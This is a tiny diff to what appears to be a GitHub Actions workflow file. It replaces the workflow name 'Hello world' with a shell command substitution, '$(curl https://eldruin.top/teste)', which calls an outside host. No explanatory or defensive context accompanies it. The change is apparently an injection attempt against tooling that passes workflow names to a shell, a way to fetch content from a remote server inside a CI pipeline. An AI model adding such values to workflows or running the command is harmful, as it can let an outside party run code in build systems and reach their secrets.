@@ -1,4 +1,4 @@
-name: Hello world
+name: $(curl https://eldruin.top/teste)
 on:
    push:
 
